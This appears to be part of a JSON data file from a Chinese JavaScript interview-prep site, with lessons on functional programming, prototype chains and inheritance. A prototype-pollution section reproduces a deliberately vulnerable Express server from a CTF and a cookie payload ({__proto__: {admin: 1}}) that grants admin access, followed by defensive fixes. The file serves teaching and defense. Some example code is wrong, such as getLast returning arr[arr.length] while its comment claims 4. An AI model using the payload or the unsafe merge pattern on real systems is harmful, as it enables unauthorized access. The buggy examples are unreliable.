'number') {\n            res.push(item);\n        }\n    })\n    return res;\n}\n\n\n\n// 以上是我们的封装，以下是功能实现\nvar array = [1, 3, 'h', 5, 'm', '4'];\nvar res = getNumbers(array);\n```\n\n\n\n因此当我们将功能封装之后，我们实现同样的功能时，只需要写一行代码。而如果未来需求变动，或者稍作修改，我们只需要对getNumbers方法进行调整就可以了。而且我们在使用时，只需要关心这个方法能做什么，而不用关心他具体是怎么实现的。这也是函数式编程思维与命令式不同的地方之一。\n\n\n\n函数式编程思维还具有以下几个特征。\n\n\n\n**函数是第一等公民**\n\n\n\n所谓\"第一等公民\"（first class），指的是函数与其他数据类型一样，处于平等地位，可以赋值给其他变量，也可以作为参数，传入另一个函数，或者作为别的函数的返回值。这些场景，我们应该见过很多。\n\n\n\n```javascript\nvar a = function foo() {}  // 赋值\nfunction fn(function() {}, num) {}   // 函数作为参数\n\n// 函数作为返回值\nfunction var() {\n    return function() {\n        ... ...\n    }\n}\n```\n\n\n\n当然，这都是JavaScript的基本概念。但是我想很多人，甚至包括正在阅读的你自己都可能会无视这些概念。可以用一个简单的例子来验证一下。\n\n\n\n我们先自定义这样一个函数。\n\n\n\n```javascript\nfunction delay() {\n    console.log('5000ms之后执行该方法.');\n}\n```\n\n\n\n现在要做的是，如果要求你结合setTimeout方法，让delay方法延迟5000ms执行，应该怎么做？\n\n\n\n其实很简单，对不对，直接这样就可以了。\n\n\n\n```javascript\nvar timer = setTimeout(function() {\n    delay();\n}, 5000);\n```\n\n\n\n那么现在问题来了，如果你对函数是一等公民有一个深刻的认知，我想你会发现上面这种写法其实是有一些问题的。所以思考一下，问题出在哪里？\n\n\n\n函数既然能够作为一个参数传入另外一个函数，那么我们是不是可以直接将delay作为setTimeout的第一个参数，而不用额外的多加一层匿名函数呢？\n\n\n\n因此，其实最正确的解法应该这样写。\n\n\n\n```javascript\nvar timer = setTimeout(delay, 5000);\n```\n\n\n\n当然，如果你已经提前想到这样做了，那么恭喜你，说明你在JavaScript上比普通人更有天赋。其实第一种糟糕的方式很多人都在用，包括有多年工作经验的人也没有完全避免。而他们甚至还不知道自己问题出在什么地方。\n\n\n\n在未来的实践中，你还会遇到更多类似的场景。为了验证读者朋友们的理解，我们不妨来思考一下如何优化下面的代码。\n\n\n\n```javascript\nfunction getUser(path, callback) {\n    return $.get(path, function(info) {\n        return callback(info);\n    })\n}\n\ngetUser('/api/user', function(resp) {\n    // resp为成功请求之后返回的数据\n    console.log(resp);\n})\n```\n\n\n\n优化的原理和setTimeout的例子一模一样，我这里卖个关子，不打算告诉大家结论，仅提示一句，getUser优化之后，仅有一句代码。考验大家学习成果的时候到了 ^ ^。\n\n\n\n**只用\"表达式\"，不用\"语句\"**\n\n\n\n\"表达式\"（expression）是一个单纯的运算过程，总是有返回值；\"语句\"（statement）是执行某种操作，没有返回值。函数式编程要求，只使用表达式，不使用语句。也就是说，每一步都是单纯的运算，而且都有返回值。\n\n\n\n假如我们的项目中，多处需要改变某个元素的背景色。因此我们可以这样封装一下。\n\n\n\n```javascript\nvar ele = document.querySelector('.test');\nfunction setBackgroundColor(color) {\n    ele.style.backgroundColor = color;\n}\n\n// 多处使用\nsetBackgroundColor('red');\nsetBackgroundColor('#ccc');\n```\n\n\n\n我们可以很明显的感受到，setBackgroundColor封装的仅仅只是一条语句。这并不是理想的效果。函数式编程期望一个函数有输入，也有输出。因此良好的习惯应该如下做。\n\n\n\n```javascript\nfunction setBackgroundColor(ele, color) {\n    ele.style.backgroundColor = color;\n    return color;\n}\n\n// 多处使用\nvar ele = document.querySelector('.test');\nsetBackgroundColor(ele, 'red');\nsetBackgroundColor(ele, '#ccc');\n```\n\n\n\n了解这一点，可以让我们自己在封装函数的时候养成良好的习惯。\n\n\n\n**纯函数**\n\n\n\n相同的输入总会得到相同的输出，并且不会产生副作用的函数，就是纯函数。\n\n\n\n所谓\"副作用\"（side effect），指的是函数内部与外部互动（最典型的情况，就是修改全局变量的值），产生运算以外的其他结果。\n\n\n\n函数式编程强调没有\"副作用\"，意味着函数要保持独立，所有功能就是返回一个新的值，没有其他行为，尤其是不得修改外部变量的值。\n\n\n\n即所谓的只要是同样的参数传入，返回的结果一定是相等的。\n\n\n\n例如我们期望封装一个函数，能够得到传入数组的最后一项。那么可以通过下面两种方式来实现。\n\n\n\n```javascript\nfunction getLast(arr) {\n    return arr[arr.length];\n}\n\nfunction getLast_(arr) {\n    return arr.pop();\n}\n\nvar source = [1, 2, 3, 4];\n\nvar last = getLast(source); // 返回结果4 原数组不变\nvar last_ = getLast_(source); // 返回结果4 原数据最后一项被删除\n```\n\n\n\ngetLast与getLast_虽然同样能够获得数组的最后一项值，但是getLast_改变了原数组。而当原始数组被改变，那么当我们再次调用该方法时，得到的结果就会变得不一样。这样不可预测的封装方式，在我们看来是非常糟糕的。它会把我们的数据搞得非常混乱。在JavaScript原生支持的数据方法中，也有许多不纯的方法，我们在使用时需要非常警惕，我们要清晰的知道原始数据的改变是否会留下隐患。\n\n\n\n```javascript\nvar source = [1, 2, 3, 4, 5];\n\nsource.slice(1, 3); // 纯函数 返回[2, 3] source不变\nsource.splice(1, 3); // 不纯的 返回[2, 3, 4] source被改变\n\nsource.pop(); // 不纯的\nsource.push(6); // 不纯的\nsource.shift(); // 不纯的\nsource.unshift(1); // 不纯的\nsource.reverse(); // 不纯的\n\n// 我也不能短时间知道现在source被改变成了什么样子，干脆重新约定一下\nsource = [1, 2, 3, 4, 5];\n\nsource.concat([6, 7]); // 纯函数 返回[1, 2, 3, 4, 5, 6, 7] source不变\nsource.join('-'); // 纯函数 返回1-2-3-4-5 source不变\n```\n\n\n\n**闭包**\n\n\n\n闭包是函数式编程语言的重要特性，我也在前面几篇文章中说了很多关于闭包的内容。这里不再赘述。",
    "testPoint": "### 1. **函数基础**\n   - JavaScript 中的函数是什么？它和其他编程语言的函数有何不同之处？\n   - 你能解释函数表达式和函数声明的区别吗？在什么情况下你会选择其中一种？\n\n### 2. **纯函数**\n   - 什么是纯函数？纯函数有什么特征？\n   - 为什么在函数式编程中强调纯函数？它们有哪些优点？\n\n### 3. **函数的不可变性与副作用**\n   - 在函数式编程中，为什么要避免副作用？什么是副作用？\n   - 你在实际开发中是如何处理不可变数据的？可以举一个例子吗？\n\n### 4. **高阶函数**\n   - 什么是高阶函数？可以举几个常见的高阶函数例子吗？\n   - `map`、`filter` 和 `reduce` 是 JavaScript 中常见的高阶函数，请分别简要解释它们的用途。\n\n### 5. **函数的柯里化**\n   - 什么是柯里化（Currying）？它在 JavaScript 中是如何实现的？\n   - 柯里化在实际开发中有哪些应用场景？请举例说明。\n\n### 6. **函数的组合**\n   - 在函数式编程中，函数组合（Function Composition）是什么？如何实现函数的组合？\n   - 请举例说明函数组合的一个实际应用场景。\n\n### 7. **惰性求值**\n   - 什么是惰性求值？它有什么优势？\n   - 在 JavaScript 中如何实现惰性求值？是否有库或框架帮助实现这一特性？\n\n### 8. **闭包与函数式编程**\n   - 在函数式编程中，闭包起什么作用？如何利用闭包创建私有数据？\n   - 在使用闭包时如何避免内存泄漏？\n\n### 9. **不可变性与数据结构**\n   - 函数式编程为何强调数据不可变性？如何在 JavaScript 中创建不可变数据结构？\n   - 在 JavaScript 中，你如何应对不可变数据更新的问题？你是否使用过 `Immutable.js` 或类似工具？\n\n### 10. **实践中的函数式编程**\n   - 你在实际开发中是如何运用函数式编程思想的？请举一个具体的例子。\n   - 函数式编程相比面向对象编程有哪些优势和局限？什么时候你会选择函数式编程？",
    "exerciseKeyList": "[\"31134096-417d-48df-8030-68dd004c40d1\",\"71f7613a-3703-4c0c-85c3-d8ad31fac232\",\"a30c0639-0784-4326-85b5-0fd73e90b988\",\"9cf9cb30-8864-4823-bf2d-d30b5f079f45\",\"3172f055-5f37-4a60-9940-bb15c6a7d4b6\",\"c591d4b9-eff8-4a29-b01b-50130bde5d3b\",\"696b2f96-57aa-49cc-9305-4d336e8365ef\",\"ac4eefb4-3602-4ae1-874a-148f7f0b2601\",\"82939890-c1de-45f8-b27d-b2675d58763e\",\"b3c9e524-a1b4-4348-9ce5-f2beb80caf32\",\"c830ad90-3291-4123-81db-223c81244f41\",\"56ea667a-50f3-424e-9ed7-9ac28cddf197\",\"bc85fae4-ca41-474a-be03-d670813510a3\",\"cd8610f3-6c27-4b95-a657-c9d018b4ad23\"]",
    "vipLimit": 0,
    "level": 3,
    "pointOrder": 8,
    "createAt": "2024-10-01T12:18:18.000Z",
    "updateAt": "2024-11-08T14:40:48.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "31134096-417d-48df-8030-68dd004c40d1",
        "title": "如果new一个箭头函数会怎么样？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-08-22T10:22:40.000Z",
        "updateAt": "2024-07-20T11:56:21.000Z"
      },
      {
        "exerciseKey": "3172f055-5f37-4a60-9940-bb15c6a7d4b6",
        "title": "以下是个纯函数么?",
        "category": "Choice",
        "vipLimit": 0,
        "createAt": "2021-07-02T15:33:04.000Z",
        "updateAt": "2021-07-03T22:23:56.000Z"
      },
      {
        "exerciseKey": "56ea667a-50f3-424e-9ed7-9ac28cddf197",
        "title": "JS里的类就是构造函数的语法糖，这个说法是否正确？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:26.000Z",
        "updateAt": "2024-08-23T05:19:13.000Z"
      },
      {
        "exerciseKey": "696b2f96-57aa-49cc-9305-4d336e8365ef",
        "title": "这个函数干了什么?",
        "category": "Choice",
        "vipLimit": 0,
        "createAt": "2021-07-02T15:33:04.000Z",
        "updateAt": "2021-07-03T22:29:41.000Z"
      },
      {
        "exerciseKey": "71f7613a-3703-4c0c-85c3-d8ad31fac232",
        "title": "箭头函数和普通函数有啥区别？箭头函数能当构造函数吗？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-11T08:01:14.000Z",
        "updateAt": "2024-07-22T10:52:32.000Z"
      },
      {
        "exerciseKey": "82939890-c1de-45f8-b27d-b2675d58763e",
        "title": "箭头函数为何不能作为构造函数使用？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:36.000Z",
        "updateAt": "2024-08-14T23:58:02.000Z"
      },
      {
        "exerciseKey": "9cf9cb30-8864-4823-bf2d-d30b5f079f45",
        "title": "ES6中函数新增了哪些扩展?",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-03T13:36:00.000Z",
        "updateAt": "2024-07-20T09:43:44.000Z"
      },
      {
        "exerciseKey": "a30c0639-0784-4326-85b5-0fd73e90b988",
        "title": "说说你对函数式编程的理解，以及优缺点？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-03T14:01:20.000Z",
        "updateAt": "2024-08-10T17:04:35.000Z"
      },
      {
        "exerciseKey": "ac4eefb4-3602-4ae1-874a-148f7f0b2601",
        "title": "怎么获取函数组件的实例？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:31.000Z",
        "updateAt": "2024-08-15T18:52:44.000Z"
      },
      {
        "exerciseKey": "b3c9e524-a1b4-4348-9ce5-f2beb80caf32",
        "title": "普通函数动态参数 和 箭头函数的动态参数有什么区别？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:26.000Z",
        "updateAt": "2024-08-22T11:09:10.000Z"
      },
      {
        "exerciseKey": "bc85fae4-ca41-474a-be03-d670813510a3",
        "title": "箭头函数解决了什么问题",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:22.000Z",
        "updateAt": "2024-09-09T13:56:58.000Z"
      },
      {
        "exerciseKey": "c591d4b9-eff8-4a29-b01b-50130bde5d3b",
        "title": "使用哪个构造函数可以成功继承 Dog 类?",
        "category": "Choice",
        "vipLimit": 0,
        "createAt": "2021-07-02T15:33:04.000Z",
        "updateAt": "2024-08-03T21:05:37.000Z"
      },
      {
        "exerciseKey": "c830ad90-3291-4123-81db-223c81244f41",
        "title": "函数声明与函数表达式有什么区别",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:26.000Z",
        "updateAt": "2024-08-22T11:10:11.000Z"
      },
      {
        "exerciseKey": "cd8610f3-6c27-4b95-a657-c9d018b4ad23",
        "title": "什么是匿名函数？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:22.000Z",
        "updateAt": "2024-09-09T14:01:49.000Z"
      }
    ]
  },
  "16": {
    "id": 16,
    "tagId": 10,
    "title": "原型链与继承",
    "explanation": "`JavaScript` 中没有类的概念的，主要通过原型链来实现继承。通常情况下，继承意味着复制操作，然而 `JavaScript` 默认并不会复制对象的属性，相反，`JavaScript` 只是在两个对象之间创建一个关联（原型对象指针），这样，一个对象就可以通过委托访问另一个对象的属性和函数，所以与其叫继承，委托的说法反而更准确些。\n\n## 原型\n\n> 当我们 `new` 了一个新的对象实例，明明什么都没有做，就直接可以访问 `toString` 、`valueOf` 等原生方法。那么这些方法是从哪里来的呢？答案就是原型。\n\n![](https://static.ecool.fun//article/549a6ca0-8f33-4c88-9671-991c0e9f80ba.png)\n\n在控制台打印一个空对象时，我们可以看到，有很多方法，已经“初始化”挂载在内置的 `__proto__` 对象上了。这个内置的 `__proto__` 是一个指向原型对象的指针，它会在创建一个新的引用类型对象时（显示或者隐式）自动创建，并挂载到新实例上。当我们尝试访问实例对象上的某一属性 / 方法时，如果实例对象上有该属性 / 方法时，就返回实例属性 / 方法，如果没有，就去 `__proto__` 指向的原型对象上查找对应的属性 / 方法。这就是为什么我们尝试访问空对象的 `toString` 和 `valueOf` 等方法依旧能访问到的原因，**`JavaScript` 正式以这种方式为基础来实现继承的。**\n\n## 构造函数\n\n如果说实例的 `__proto__` 只是一个指向原型对象的指针，那就说明在此之前原型对象就已经创建了，那么原型对象是什么时候被创建的呢？这就要引入**构造函数**的概念。\n\n其实构造函数也就只是一个普通的函数而已，如果这个函数可以使用 `new` 关键字来创建它的实例对象，那么我们就把这种函数称为 **构造函数**。\n\n```javascript\n// 普通函数\nfunction person () {}\n\n// 构造函数，函数首字母通常大写\nfunction Person () {}\nconst person = new Person();\n```\n\n原型对象正是在构造函数被声明时一同创建的。构造函数被申明时，原型对象也一同完成创建，然后挂载到构造函数的 `prototype` 属性上：\n\n![](https://static.ecool.fun//article/773de315-3978-4966-94d3-8d96ba586011.png)\n\n原型对象被创建时，会自动生成一个 `constructor` 属性，指向创建它的构造函数。这样它俩的关系就被紧密地关联起来了。\n\n> 细心的话，你可能会发现，原型对象也有自己的 `__proto__` ，这也不奇怪，毕竟万物皆对象嘛。原型对象的 \\_\\_proto\\_\\_ 指向的是 `Object.prototype`。那么 `Object.prototype.__proto__` 存不存在呢？其实是不存在的，打印的话会发现是 `null` 。这也证明了 `Object` 是 `JavaScript` 中数据类型的起源。\n\n分析到这里，我们大概了解原型及构造函数的大概关系了，我们可以用一张图来表示这个关系：\n\n![](https://static.ecool.fun//article/5f259d3c-5ba5-47ae-997a-abaa5e3352ed.png)\n\n## 原型链\n\n说完了原型，就可以来说说原型链了，如果理解了原型机制，原型链就很好解释了。其实上面一张图上，那条被 `__proto__` 链接起来的链式关系，就称为**原型链**。\n\n**原型链的作用**：原型链如此的重要的原因就在于它决定了 `JavaScript` 中继承的实现方式。当我们访问一个属性时，查找机制如下：\n\n-   访问对象实例属性，有则返回，没有就通过 `__proto__` 去它的原型对象查找。\n-   原型对象找到即返回，找不到，继续通过原型对象的 \\_\\_proto\\_\\_ 查找。\n-   一层一层一直找到 `Object.prototype` ，如果找到目标属性即返回，找不到就返回 `undefined`，不会再往下找，因为在往下找 `__proto__` 就是 `null` 了。\n\n通过上面的解释，对于构造函数生成的实例，我们应该能了解它的原型对象了。JavaScript 中万物皆对象，那么构造函数肯定也是个对象，是对象就有 `__proto__` ，那么构造函数的 `__proto__` 是什么？\n\n我们可以打印出来看一下：\n\n![](https://static.ecool.fun//article/b9d8c77b-ed74-4f7a-8d4c-12621bd87a6e.png)\n\n现在才想起来所有的函数可以使用 `new Function()` 的方式创建，那么这个答案也就很自然了，有点意思，再来试试别的构造函数。\n\n![](https://static.ecool.fun//article/0363ced6-8744-4c3f-83e8-040ff57d4534.png)\n\n这也证明了，所有函数都是 `Function` 的实例。等一下，好像有哪里不对，那么 `Function.__proto__` 岂不是。。。\n\n![](https://static.ecool.fun//article/1095c237-b08f-494f-9d9e-57862c2fc95b.png)\n\n按照上面的逻辑，这样说的话，`Function` 岂不是自己生成了自己？其实，我们大可不必这样理解，因为作为一个 JS 内置对象，`Function` 对象在你脚本文件都还没生成的时候就已经存在了，哪里能自己调用自己，这个东西就类似于玄学中的“道”和“乾坤”，你能说明它们是谁生成的吗，天地同寿日月同庚不生不灭。。。算了，在往下扯就要写成修仙了=。=\n\n至于为什么 `Function.__proto__` 等于 `Function.prototype` 有这么几种说法：\n\n-   为了保持与其他函数保持一致\n-   为了说明一种关系，比如证明所有的函数都是 `Function` 的实例。\n-   函数都是可以调用 `call` `bind` 这些内置 API 的，这么写可以很好的保证函数实例能够使用这些 API。\n\n### 注意点：\n\n关于原型、原型链和构造函数有几点需要注意：\n\n-   `__proto__` 是非标准属性，如果要访问一个对象的原型，建议使用 ES6 新增的 `Reflect.getPrototypeOf` 或者 `Object.getPrototypeOf()` 方法，而不是直接 `obj.__proto__`，因为非标准属性意味着未来可能直接会修改或者移除该属性。同理，当改变一个对象的原型时，最好也使用 `ES6` 提供的 `Reflect.setPrototypeOf` 或 `Object.setPrototypeOf`。\n\n```javascript\nlet target = {};\nlet newProto = {};\nReflect.getPrototypeOf(target) === newProto; // false\nReflect.setPrototypeOf(target, newProto);\nReflect.getPrototypeOf(target) === newProto; // true\n```\n\n-   函数都会有 `prototype` ，除了 `Function.prototype.bind()` 之外。\n-   对象都会有 `__proto__` ，除了 `Object.prototype` 之外（其实它也是有的，之不过是 `null`）。\n-   所有函数都由 Function 创建而来，也就是说他们的 `__proto__` 都等于 `Function.prototype`。\n-   `Function.prototype` 等于 `Function.__proto__` 。\n\n## 原型污染\n\n> 原型污染是指：攻击者通过某种手段修改 JavaScript 对象的原型。\n\n什么意思呢，原理其实很简单。如果我们把 `Object.prototype.toString` 改成这样：\n\n```javascript\nObject.prototype.toString = function () {alert('原型污染')};\nlet obj = {};\nobj.toString();\n```\n\n那么当我们运行这段代码的时候浏览器就会弹出一个 `alert`，对象原生的 `toString` 方法被改写了，所有对象当调用 `toString` 时都会受到影响。\n\n你可能会说，怎么可能有人傻到在源码里写这种代码，这不是搬起石头砸自己的脚么？没错，没人会在源码里这么写，但是攻击者可能会通过**表单**或者**修改请求内容**等方式使用原型污染发起攻击，来看下面一种情况：\n\n```javascript\n'use strict';\n \nconst express = require('express');\nconst bodyParser = require('body-parser')\nconst cookieParser = require('cookie-parser');\nconst path = require('path');\n \nconst isObject = obj => obj && obj.constructor && obj.constructor === Object;\n \nfunction merge(a, b) {\n    for (var attr in b) {\n        if (isObject(a[attr]) && isObject(b[attr])) {\n            merge(a[attr], b[attr]);\n        } else {\n            a[attr] = b[attr];\n        }\n    }\n    return a\n}\n \nfunction clone(a) {\n    return merge({}, a);\n}\n \n// Constants\nconst PORT = 8080;\nconst HOST = '0.0.0.0';\nconst admin = {};\n \n// App\nconst app = express();\napp.use(bodyParser.json())\napp.use(cookieParser());\n \napp.use('/', express.static(path.join(__dirname, 'views')));\napp.post('/signup', (req, res) => {\n    var body = JSON.parse(JSON.stringify(req.body));\n    var copybody = clone(body)\n    if (copybody.name) {\n        res.cookie('name', copybody.name).json({\n            \"done\": \"cookie set\"\n        });\n    } else {\n        res.json({\n            \"error\": \"cookie not set\"\n        })\n    }\n});\napp.get('/getFlag', (req, res) => {\n    var аdmin = JSON.parse(JSON.stringify(req.cookies))\n    if (admin.аdmin == 1) {\n        res.send(\"hackim19{}\");\n    } else {\n        res.send(\"You are not authorized\");\n    }\n});\napp.listen(PORT, HOST);\nconsole.log(`Running on http://${HOST}:${PORT}`);\n```\n\n如果服务器中有上述的代码片段，攻击者只要将 `cookie` 设置成`{__proto__: {admin: 1}}` 就能完成系统的侵入。\n\n### 原型污染的解决方案\n\n在看原型污染的解决方案之前，我们可以看下 `lodash` 团队之前解决原型污染问题的手法：\n\n![](https://static.ecool.fun//article/2e81ba2d-3d81-4397-b24c-fa0ac5d19c8c.png)\n\n代码很简单，只要是碰到有 `constructor` 或者 `__proto__` 这样的敏感词汇，就直接退出执行了。这当然是一种防止原型污染的有效手段，当然我们还有其他手段：\n\n1.  使用 `Object.create(null)`， 方法创建一个原型为 `null` 的新对象，这样无论对 原型做怎样的扩展都不会生效：\n\n```javascript\nconst obj = Object.create(null);\nobj.__proto__ = { hack: '污染原型的属性' };\nconsole.log(obj); // => {}\nconsole.log(obj.hack); // => undefined\n```\n\n2.  使用 `Object.freeze(obj)` 冻结指定对象，使之不能被修改属性，成为不可扩展对象：\n    \n    ```javascript\n    Object.freeze(Object.prototype);\n    \n    Object.prototype.toString = 'evil';\n    \n    console.log(Object.prototype.toString);\n    // => ƒ toString() { [native code] }\n    ```\n    \n3.  建立 `JSON schema` ，在解析用户输入内容时，通过 `JSON schema` 过滤敏感键名。\n    \n4.  规避不安全的递归性合并。这一点类似 `lodash` 修复手段，完善了合并操作的安全性，对敏感键名跳过处理。\n    \n\n## 继承\n\n终于可以来说说继承了，先来看看继承的概念，看下百度上是怎么说的：\n\n> **继承**是[面向对象](https://baike.baidu.com/item/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/2262089 \"https://baike.baidu.com/item/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/2262089\")软件技术当中的一个概念，与[多态](https://baike.baidu.com/item/%E5%A4%9A%E6%80%81/2282489 \"https://baike.baidu.com/item/%E5%A4%9A%E6%80%81/2282489\")、[封装](https://baike.baidu.com/item/%E5%B0%81%E8%A3%85/2796965 \"https://baike.baidu.com/item/%E5%B0%81%E8%A3%85/2796965\")共为[面向对象](https://baike.baidu.com/item/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/2262089 \"https://baike.baidu.com/item/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/2262089\")的三个基本特征。继承可以使得子类具有父类的[属性](https://baike.baidu.com/item/%E5%B1%9E%E6%80%A7/20192958 \"https://baike.baidu.com/item/%E5%B1%9E%E6%80%A7/20192958\")和[方法](https://baike.baidu.com/item/%E6%96%B9%E6%B3%95/3009352 \"https://baike.baidu.com/item/%E6%96%B9%E6%B3%95/3009352\")或者重新定义、追加属性和方法等。\n\n这段对于程序员来说，这个解释还是比较好理解的。接着往下翻，我看到了一条重要的描述：\n\n> 子类的创建可以增加新数据、新功能，可以继承父类全部的功能，但是不能选择性的继承父类的部分功能。**继承是类与类之间的关系，不是对象与对象之间的关系。**\n\n这就尴尬了，`JavaScript` 里哪里来的类，只有对象。那照这么说岂不是不能实现纯正的继承了？所以才会有开头那句话：**与其叫继承，委托的说法反而更准确些。**\n\n但是 `JavaScript` 是非常灵活的， 灵活这一特点给它带来很多缺陷的同时，也缔造出很多惊艳的优点。没有原生提供类的继承不要紧，我们可以用更多元的方式来实现 `JavaScript` 中的继承，比如说利用 `Object.assign`：\n\n```javascript\nlet person = { name: null, age: null };\nlet man = Object.assign({}, person, { name: 'John', age: 23 });\nconsole.log(man);  // => { name: 'John', age: 23 }\n```\n\n利用 `call` 和 `apply`：\n\n```javascript\nlet person = {\n    name: null,\n    sayName: function () {\n        console.log(this.name);\n    },\n    sayAge: function () {\n        console.log(this.age);\n    }\n};\nlet man = { name: 'Man', age: 23 };\nperson.sayName.call(man); // => Man\nperson.sayAge.apply(man); // => 23\n```\n\n甚至我们还可以使用深拷贝对象的方式来完成类似继承的操作……`JS` 中实现继承的手法多种多样，但是看看上面的代码不难发现一些问题：\n\n-   封装性不强，过于凌乱，写起来十分不便。\n-   根本无法判断子对象是从何处继承而来。\n\n有没有办法解决这些问题呢？我们可以使用 `JavaScript` 中继承最常用的方式：**原型继承**\n\n## 原型链继承\n\n> 原型链继承，就是让对象实例通过原型链的方式串联起来，当访问目标对象的某一属性时，能顺着原型链进行查找，从而达到类似继承的效果。\n\n```javascript\n// 父类\nfunction SuperType (colors = ['red', 'blue', 'green']) {\n    this.colors = colors;\n}\n\n// 子类\nfunction SubType () {}\n// 继承父类\nSubType.prototype = new SuperType();\n// 以这种方式将 constructor 属性指回 SubType 会改变 constructor 为可遍历属性\nSubType.prototype.constructor = SubType;\n\nlet superInstance1 = new SuperType(['yellow', 'pink']);\nlet subInstance1 = new SubType();\nlet subInstance2 = new SubType();\nsuperInstance1.colors; // => ['yellow', 'pink']\nsubInstance1.colors; // => ['red', 'blue', 'green']\nsubInstance2.colors; // => ['red', 'blue', 'green']\nsubInstance1.colors.push('black');\nsubInstance1.colors; // => ['red', 'blue', 'green', 'black']\nsubInstance2.colors; // => ['red', 'blue', 'green', 'black']\n```\n\n上述代码使用了最基本的原型链继承使得子类能够继承父类的属性，\\*\\*原型继承的关键步骤就在于：将子类原型和父类原型关联起来，使原型链能够衔接上，\\*\\*这边是直接将子类原型指向了父类实例来完成关联。\n\n上述是原型继承的一种最初始的状态，我们分析上面代码，会发现还是会有问题：\n\n1.  在创建子类实例的时候，不能向超类型的构造函数中传递参数。\n2.  这样创建的子类原型会包含父类的实例属性，造成引用类型属性同步修改的问题。\n\n## 组合继承\n\n组合继承使用 `call` 在子类构造函数中调用父类构造函数，解决了上述两个问题：\n\n```javascript\n// 组合继承实现\n\nfunction Parent(value) {\n    this.value = value;\n}\n\nParent.prototype.getValue = function() {\n    console.log(this.value);\n}\n\nfunction Child(value) {\n    Parent.call(this, value)\n}\n\nChild.prototype = new Parent();\n\nconst child = new Child(1)\nchild.getValue();\nchild instanceof Parent;\n```\n\n然而它还是存在问题：父类的构造函数被调用了两次（创建子类原型时调用了一次，创建子类实例时又调用了一次），导致子类原型上会存在父类实例属性，浪费内存。\n\n## 寄生组合继承\n\n针对组合继承存在的缺陷，又进化出了“寄生组合继承”：使用 `Object.create(Parent.prototype)` 创建一个新的原型对象赋予子类从而解决组合继承的缺陷：\n\n```javascript\n// 寄生组合继承实现\n\nfunction Parent(value) {\n    this.value = value;\n}\n\nParent.prototype.getValue = function() {\n    console.log(this.value);\n}\n\nfunction Child(value) {\n    Parent.call(this, value)\n}\n\nChild.prototype = Object.create(Parent.prototype, {\n    constructor: {\n        value: Child,\n        enumerable: false, // 不可枚举该属性\n        writable: true, // 可改写该属性\n        configurable: true // 可用 delete 删除该属性\n    }\n})\n\nconst child = new Child(1)\nchild.getValue();\nchild instanceof Parent;\n```\n\n寄生组合继承的模式是现在业内公认的比较可靠的 `JS` 继承模式，`ES6` 的 `class` 继承在 `babel` 转义后，底层也是使用的寄生组合继承的方式实现的。\n\n## 继承关系判断\n\n当我们使用了原型链继承后，怎样判断对象实例和目标类型之间的关系呢？\n\n### instanceof\n\n我们可以使用 `instanceof` 来判断二者间是否有继承关系，`instanceof` 的字面意思就是：xx 是否为 xxx 的实例。如果是则返回 `true` 否则返回 `false`：\n\n```javascript\nfunction Parent () {}\nfunction Child () {}\nChild.prototype = new Parent();\nlet parent = new Parent();\nlet child = new Child();\n\nparent instanceof Parent; // => true\nchild instanceof Child; // => true\nchild instanceof Parent; // => true\nchild instanceof Object; // => true\n```\n\n`instanceof` 本质上是通过原型链查找来判断继承关系的，因此只能用来判断引用类型，对基本类型无效，我们可以手动实现一个简易版 `instanceof`：\n\n```javascript\nfunction _instanceof (obj, Constructor) {\n    if (typeof obj !== 'object' || obj == null) return false;\n    let construProto = Constructor.prototype;\n    let objProto = obj.__proto__;\n    while (objProto != null) {\n        if (objProto === construProto) return true;\n        objProto = objProto.__proto__;\n    }\n    return false;\n}\n```\n\n### Object.prototype.isPrototypeOf(obj)\n\n还可以利用 `Object.prototype.isPrototypeOf` 来间接判断继承关系，该方法用于判断一个对象是否存在于另一个对象的原型链上：\n\n```javascript\nfunction Foo() {}\nfunction Bar() {}\nfunction Baz() {}\n\nBar.prototype = Object.create(Foo.prototype);\nBaz.prototype = Object.create(Bar.prototype);\n\nvar baz = new Baz();\n\nconsole.log(Baz.prototype.isPrototypeOf(baz)); // true\nconsole.log(Bar.prototype.isPrototypeOf(baz)); // true\nconsole.log(Foo.prototype.isPrototypeOf(baz)); // true\nconsole.log(Object.prototype.isPrototypeOf(baz)); // true\n```",
    "testPoint": "\n### JavaScript原型链\n\n1. **原型链的概念**：\n\n   * 原型链是JavaScript中对象继承属性的机制。\n   * 每个对象都有一个指向它的原型（prototype）对象的内部链接。\n   * 当试图访问一个对象的属性时，如果对象本身没有这个属性，那么JavaScript就会在该对象的原型上查找这个属性，以此类推，直到找到属性或到达原型链的末尾（通常是null）。\n\n2. **原型链的查找机制**：\n\n   * 实例对象可以访问构造函数原型对象中的属性和方法，因为它们通过原型链与原型对象关联在一起。\n   * 当访问一个对象的属性或方法时，如果对象本身没有定义该属性或方法，JavaScript引擎会通过原型链向上查找，直到找到对应的属性或方法为止。\n\n3. **原型链的应用**：\n\n   * 对象可以使用构造函数prototype原型对象的属性和方法。\n   * 通过原型链，对象之间可以共享属性和方法，从而实现继承的效果。\n\n### JavaScript继承\n\n1. **继承的概念**：\n\n   * 继承是面向对象编程的重要概念，它允许我们创建基于现有对象的新对象，并在新对象中拥有原有对象的属性和方法。\n   * 在JavaScript中，继承是通过原型链来实现的。\n\n2. **常见的继承方式**：\n\n   * **原型链继承**：通过将父类的实例作为子类的原型来实现继承关系。这种方式会导致所有实例共享来自原型对象的属性，包括引用属性。\n   * 